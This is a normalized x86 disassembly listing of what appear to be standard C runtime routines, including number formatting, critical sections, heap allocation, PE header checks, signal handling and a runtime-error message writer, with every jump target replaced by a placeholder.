lea ecx [ ebp - 0x14 ]
push ebx
push esi
push [ ebp + 0x1c ]
mov eax [ eax + 0x4 ]
dec eax
mov [ ebp - 0x4 ] eax
call sub_1003cf9b
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100417ee
push 0x16
pop ebx
mov [ eax ] ebx
call sub_1003fe28
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp [ ebp + 0x18 ] bl
je r-xdata
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x2d
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx edi
jne r-xdata
mov eax [ eax + 0x4 ]
test eax eax
jg r-xdata
mov [ esi ] 0x2d
inc esi
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ edx ] 0x2d
sete al
add eax ecx
mov [ eax + esi ] 0x30
add esi eax
push 0x1
push esi
call sub_10044f93
pop ecx
mov [ esi ] 0x30
inc esi
pop ecx
jmp r-xdata
pop edi
push 0x1
push esi
call sub_10044f93
mov eax [ ebp - 0x14 ]
pop ecx
pop ecx
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
mov eax [ ebp + 0x14 ]
mov eax [ eax + 0x4 ]
test eax eax
jns r-xdata
test edi edi
jle r-xdata
cmp [ ebp + 0x18 ] bl
je r-xdata
neg eax
cmp edi eax
jl r-xdata
mov edi eax
neg edi
jmp r-xdata
push edi
push esi
call sub_10044f93
push edi
push 0x30
push esi
call sub_10045ec0
add esp 0x14
mov edi eax
sub_10044c49
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
push ebx
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10047f59
add esp 0x14
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_100417ee
mov [ eax ] ebx
call sub_1003fe28
mov eax ebx
jmp r-xdata
or ecx 0xffffffff
cmp esi ecx
je r-xdata
call sub_100417ee
mov [ eax ] ebx
call sub_1003fe28
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x28 ]
add eax ebx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
push ecx
sete al
add eax edi
push eax
call sub_10047c97
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov ecx esi
cmp [ ebp - 0x2c ] 0x2d
sete al
sub ecx eax
pop esi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push ebx
push esi
push edi
call sub_10044b5d
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
sub_10044d0a
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
push ebx
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10047f59
add esp 0x14
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_100417ee
mov [ eax ] ebx
call sub_1003fe28
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x2c ]
xor ecx ecx
dec eax
cmp [ ebp - 0x30 ] 0x2d
mov [ ebp - 0x20 ] eax
sete cl
or eax 0xffffffff
lea ebx [ ecx + edi ]
cmp esi eax
je r-xdata
call sub_100417ee
mov [ eax ] ebx
call sub_1003fe28
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x30 ]
push ecx
push [ ebp + 0x14 ]
push eax
push ebx
call sub_10047c97
add esp 0x10
test eax eax
je r-xdata
mov eax esi
sub eax ecx
pop esi
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ edi ] 0x0
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push edi
call sub_1004493e
add esp 0x1c
cmp eax [ ebp + 0x14 ]
jge r-xdata
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x14 ]
push esi
push edi
call sub_10044b5d
add esp 0x18
jmp r-xdata
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
mov [ ebx - 0x2 ] al
sub_10044e1a
push ebp
mov ebp esp
sub esp 0x10
push edi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1003cf9b
mov edx [ ebp + 0x8 ]
mov edi [ ebp - 0x10 ]
mov cl [ edx ]
test cl cl
je r-xdata
mov al [ edx ]
inc edx
test al al
je r-xdata
mov eax [ edi + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
cmp [ ebp - 0x4 ] 0x0
pop edi
je r-xdata
jmp r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edx ]
test al al
jne r-xdata
cmp cl al
je r-xdata
cmp al 0x65
je r-xdata
push esi
mov esi edx
cmp al 0x45
je r-xdata
dec edx
cmp [ edx ] 0x30
je r-xdata
mov eax [ edi + 0x84 ]
mov ecx [ eax ]
mov al [ edx ]
cmp al [ ecx ]
jne r-xdata
inc edx
mov al [ esi ]
inc edx
inc esi
mov [ edx ] al
test al al
jne r-xdata
dec edx
pop esi
sub_10044eb2
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_10047e79
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_10047deb
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
add esp 0xc
mov esp ebp
pop ebp
retn
sub_10044f05
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push esi
push [ ebp + 0xc ]
call sub_1003cf9b
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_10042874
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_10047b28
test eax eax
movsx eax [ esi ]
push eax
call sub_10042874
pop ecx
cmp eax 0x78
jne r-xdata
mov eax [ ebp - 0x10 ]
mov cl [ esi ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
add esi 0x2
mov al [ esi ]
mov [ esi ] cl
mov cl al
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10044f79
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
fldz
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_10044f93
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_1003e2d0
inc eax
push eax
lea eax [ esi + edi ]
push esi
push eax
call sub_1003c640
add esp 0x10
pop esi
sub_10044fbb
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_100480ef
add esp 0xc
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1003fe38
int3
pop esi
retn
sub_10045009
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi * 8 + rw-data ] 0x0
jne r-xdata
push [ esi * 8 + rw-data ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push esi
call sub_10045091
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1003edd7
sub_1004503d
push esi
push edi
mov esi rw-data
mov edi esi
push ebx
add edi 0x8
cmp edi rw-data
jl r-xdata
cmp [ edi + 0x4 ] 0x1
je r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
pop ebx
push ebx
call [ DeleteCriticalSection@IAT ]
push ebx
call sub_1003f3e3
and [ edi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call [ DeleteCriticalSection@IAT ]
sub_10045091
push 0x8
push r--data
call sub_1003f180
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp [ edi * 8 + rw-data ] ebx
jne r-xdata
call sub_10045188
push 0x1e
call sub_100451e5
push 0xff
call sub_1003ecb4
xor eax eax
inc eax
push 0x18
call sub_1003f0e4
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0xa
call sub_10045009
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ edi * 8 + rw-data ] ebx
jne r-xdata
call sub_100417ee
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
push esi
call sub_1003f3e3
pop ecx
push ebx
push 0xfa0
push esi
call sub_100431f9
add esp 0xc
mov [ edi * 8 + rw-data ] esi
jmp r-xdata
call sub_1003f1c5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10045131
sub_1004513a
push esi
push edi
mov esi rw-data
mov edi rw-data
add esi 0x8
cmp esi rw-data
jl r-xdata
push 0x0
mov [ esi ] edi
add edi 0x18
push 0xfa0
push [ esi ]
call sub_100431f9
add esp 0xc
cmp [ esi + 0x4 ] 0x1
jne r-xdata
xor eax eax
pop edi
inc eax
pop esi
retn
sub_10045188
push 0x3
call sub_10048155
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_100451e5
push 0xff
call sub_100451e5
pop ecx
pop ecx
push 0x3
call sub_10048155
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_100451c1
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x17
jb r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_100451e5
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_100451c1
mov edi eax
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1003c623
mov esp ebp
pop ebp
retn
push ebx
push 0x3
call sub_10048155
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x3
call sub_10048155
pop ecx
test eax eax
jne r-xdata
pop ebx
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor ebx ebx
mov ecx ebx
push r--data
push 0x314
push rw-data
call sub_1003d249
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
mov [ ebp - 0x5 ] bl
push eax
lea eax [ ebp - 0x1f8 ]
push eax
call sub_1003e2d0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc ecx
cmp ecx 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1003fe38
int3
push 0x104
push rw-data
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi 0x2fb
test eax eax
jne r-xdata
mov al [ edi + ecx * 2 ]
mov [ ebp + ecx - 0x1f8 ] al
cmp [ edi + ecx * 2 ] bx
je r-xdata
push rw-data
call sub_1004776f
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push esi
push rw-data
call sub_1003d249
add esp 0xc
test eax eax
jne r-xdata
push r--data
push 0x314
mov esi rw-data
push esi
call sub_1003d941
add esp 0xc
test eax eax
jne r-xdata
push rw-data
call sub_1004776f
push 0x3
push r--data
lea ecx [ eax * 2 + rw-data ]
mov eax ecx
sub eax rw-data
sar eax 0x1
sub esi eax
push esi
push ecx
call sub_100477a7
add esp 0x14
test eax eax
jne r-xdata
push edi
push 0x314
push esi
call sub_1003d941
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push esi
call sub_10048195
add esp 0xc
jmp r-xdata
sub_100453b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push ebx
push esi
push edi
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
add eax ecx
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10045400
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1003f1e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_100454c0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_100453b0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100454c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_1004551a
push 0x24
push r--data
call sub_1003f180
and [ ebp - 0x2c ] 0x0
and [ ebp - 0x30 ] 0x0
xor ebx ebx
mov [ ebp - 0x20 ] ebx
xor edi edi
mov [ ebp - 0x28 ] edi
mov esi [ ebp + 0x8 ]
cmp esi 0xb
jg r-xdata
mov eax esi
sub eax 0xf
je r-xdata
je r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_100424c0
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax esi
push 0x2
pop ecx
sub eax ecx
je r-xdata
xor eax eax
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
push esi
call sub_100456d5
pop ecx
pop ecx
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ eax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
test ebx ebx
je r-xdata
push 0x3
call sub_1003ee86
xor ebx ebx
inc ebx
mov [ ebp - 0x20 ] ebx
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x1
je r-xdata
call sub_1003f1c5
retn
sub eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x8
je r-xdata
push 0x0
call sub_10045009
pop ecx
sub eax ecx
jne r-xdata
mov eax [ edi + 0x60 ]
mov [ ebp - 0x2c ] eax
and [ edi + 0x60 ] 0x0
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ edi + 0x64 ]
mov [ ebp - 0x30 ] eax
mov [ edi + 0x64 ] 0x8c
cmp esi 0x4
jne r-xdata
push esi
call [ ebp - 0x24 ]
push [ edi + 0x64 ]
push esi
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov edx ecx
mov [ ebp - 0x34 ] edx
cmp esi 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004569b
cmp esi 0x8
jne r-xdata
imul ecx edx 0xc
mov eax [ edi + 0x5c ]
and [ eax + ecx + 0x8 ] 0x0
inc edx
mov [ ebp - 0x34 ] edx
mov ecx [ r--data ]
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp esi 0x4
jne r-xdata
mov eax [ r--data ]
add eax ecx
cmp edx eax
jge r-xdata
sub_100456d5
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ r--data ]
push esi
mov esi [ ebp + 0x8 ]
imul ecx ecx 0xc
add ecx [ ebp + 0xc ]
cmp edx ecx
jae r-xdata
imul eax ecx 0xc
add edx 0xc
add eax [ ebp + 0xc ]
cmp edx eax
jb r-xdata
xor eax eax
cmp [ edx + 0x4 ] esi
jne r-xdata
cmp [ edx + 0x4 ] esi
je r-xdata
mov eax edx
jmp r-xdata
pop esi
pop ebp
retn
sub_1004571c
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1003fc06
pop ecx
pop ebp
retn
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1003f3e3
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_1003fc98
pop ecx
call sub_100417ee
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
inc esi
mov eax ebx
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop ebx
call sub_100417ee
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10041801
pop ecx
mov [ esi ] eax
push esi
call sub_1003fc98
pop ecx
test eax eax
je r-xdata
call sub_100417ee
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10041801
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_100457c7
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jae r-xdata
xor ecx ecx
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_100417ee
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_1003fc98
pop ecx
test eax eax
jne r-xdata
mov eax ecx
mov [ eax ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov [ eax ] 0xc
sub_10045850
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_100458e0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10047aa5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10047ac4
jmp r-xdata
sub_100458e0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_1003c623
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10045850
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10045942
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10045972
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100459a2
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_1003f3e3
pop ecx
sub_100459c0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_10045a84
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10045a0e
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_100459c0
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_10045a38
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10045a0e
pop ecx
push eax
call [ LCMapStringW@IAT ]
pop ebp
retn
xor ecx ecx
push ecx
push ecx
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10045a84
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
dec esi
je r-xdata
cmp ax [ ebp + 0x10 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_10045b00
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx r--data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fwait
mov cl [ ebp - 0x9f ]
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_10045cd0
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_1004854c
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_10045ce7
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_1004854c
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_10045d75
mov eax [ edx + 0x4 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ edx + 0x4 ]
sub esp 0xa
or eax 0x7fff0000
mov [ esp + 0x6 ] eax
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
shld eax ecx 0xb
shl ecx 0xb
mov [ esp + 0x4 ] eax
mov [ esp ] ecx
fld [ esp ]
add esp 0xa
test eax 0x0
mov eax [ edx + 0x4 ]
retn
fld [ edx ]
retn
sub_10045e05
sub esp 0x8
fst [ esp ]
mov eax [ esp + 0x4 ]
add esp 0x8
and eax 0x7ff00000
jmp r-xdata
cmp eax 0x7ff00000
je r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x3
jbe r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
cmp edx 0x1d
je r-xdata
fmul [ r--data ]
jmp r-xdata
pop edx
retn
and ax 0x20
jne r-xdata
call sub_10045cd0
pop edx
retn
call sub_10045ce7
pop edx
retn
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
sub_10045ec0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
movzx eax [ esp + 0x8 ]
bt [ rw-data ] 0x1
jae r-xdata
mov edx [ esp + 0xc ]
cmp edx 0x80
jl r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ esp + 0x8 ]
[ edi ]
jmp r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] al
